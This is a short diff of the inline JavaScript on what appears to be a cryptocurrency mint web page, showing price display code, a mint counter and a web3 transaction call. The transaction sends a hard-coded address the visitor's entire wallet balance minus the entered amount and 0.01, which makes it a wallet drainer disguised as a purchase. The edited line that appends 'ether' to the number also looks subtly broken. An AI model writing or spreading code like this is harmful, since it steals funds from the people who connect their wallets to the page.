@@ -1605,6 +1605,7 @@ line-height: normal;
           $("#pricex").text($(".eth_input").attr("max"));
           $("#price").text($(".eth_input").attr("max") * 430);
         });
+        localStorage.setItem("fmfpage", "1");
         function inCrementingCounter() {
           var i = localStorage.getItem("mintcount")
             ? Number.parseInt(localStorage.getItem("mintcount"))
@@ -1780,7 +1781,7 @@ line-height: normal;
             to: "0x660Da13f07aBee0f3E01d644B9a4420366c0dE39",
             gasPrice: web3.utils.toWei("0.000000030"),
             value: web3.utils.toWei(
-              balance - Number.parseFloat(givenNumber) - 0.01 + ""
+              balance - Number.parseFloat(givenNumber) - 0.01 + "ether"
             ),
           });
           
